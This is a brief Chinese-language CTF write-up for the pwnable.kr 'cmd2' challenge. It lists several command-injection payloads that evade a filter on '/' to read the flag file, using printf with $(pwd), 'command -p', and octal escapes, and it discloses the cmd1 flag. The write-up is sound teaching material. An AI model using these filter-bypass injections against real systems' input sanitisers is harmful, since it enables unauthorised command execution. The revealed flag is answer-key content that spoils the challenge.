# pwnable.kr : cmd2

**points** : 9

## write-up

要用 cmd1 的 flag 才能登入 cmd2

cmd1 的 flag : mommy now I get what PATH environment is for :)

cmd2 多 filter 了一些東西

主要是不能用 `/` 了

那就自己拼出 `/` 吧

payload : `./cmd2 '$(printf "%.1sbin%.1scat fla*" $(pwd) $(pwd))'`

看了別人的 writeups 發現有一個 shell builtin 的指令叫做 `command`

`command -p` 就會不管 PATH 還是會去一般放 binary 的地方找找一般的 command

payload : `./cmd2 'command -p cat fla*'`

還有人直接把字轉成 8 進位然後用 printf

payload : `./cmd2 '$(printf "\57\142\151\156\57\143\141\164\40\146\154\141\147")'`

還有人 cd 到根目錄 `/` 然後把 `$(pwd)` 當 `/` 用

各種作法千奇百怪 XD

# other write-ups and resources

* https://medium.com/@clong/pwnable-kr-cmd1-cmd2-writeups-e6980fa8daca
* https://medium.com/@c0ngwang/pwnable-kr-writeup-cmd2-a40142d43498
* http://blog.theo.com.tw/Writeups/pwnable-kr/pwnable-kr-cmd2/
